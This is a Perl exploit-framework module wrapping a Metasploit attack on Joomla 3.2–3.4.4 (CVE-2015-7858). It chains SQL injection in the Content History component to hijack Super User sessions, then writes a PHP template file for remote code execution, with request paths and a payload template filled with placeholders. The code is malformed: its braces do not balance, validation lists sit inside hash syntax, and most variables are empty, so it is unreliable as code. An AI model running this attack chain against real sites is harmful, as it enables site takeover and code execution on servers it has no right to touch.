package JOOMLA::MSF::JoomlaContenthistorySqliRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JoomlaContenthistorySqliRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-7858",
  DESCRIPTION => "

        This module exploits a SQL injection vulnerability found in Joomla versions

        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator

        component in the core of Joomla. Triggering the SQL injection makes it possible

        to retrieve active Super User sessions. The cookie can be used to login to the

        Joomla administrator backend. By creating a new template file containing our

        payload, remote code execution is made possible.

      ",
  METHOD => "POST",
  MSF_MODULE => "joomla_contenthistory_sqli_rce",
  PATH => "option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=__LIST[SELECT]__&option=com_templates&view=templates&option=com_templates&task=template.createFile&id=__ID__&file=__FILE__&option=com_templates&view=template&id=__ID__&file=__FILE__&",
  PATHS => [""],
  PAYLOAD => "type=php&name=__NAME__&jform[source]=__JFORM[SOURCE]__&task=template.apply&token=1&jform[extension_id]=__JFORM[EXTENSION_ID]__&jform[filename]=/__FILENAME__.php&",
  REFERENCES => [
    "https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/",
    "http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html",
  ],
  VARIABLES => {
    'JFORM[SOURCE]' =>       { DESCRIPTION => "", VALUE => "" },
    'FILE' =>       { DESCRIPTION => "", VALUE => "" },
    'JFORM[EXTENSION_ID]' =>       { DESCRIPTION => "", VALUE => "" },
    'LIST[SELECT]' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The base path to Joomla", VALUE => "/" },
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       (
  "`\\(.*\\)_ucm_history`",
  "::\\([A-Za-z0-9]*\\)::",
  "&amp;\\([a-z0-9]+\\)=1\\\">",
),
    'TSTRING' =>       ("Administration - Control Panel", "\\", "\\(\\"),
    'TCODE' =>       (500, 500),

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
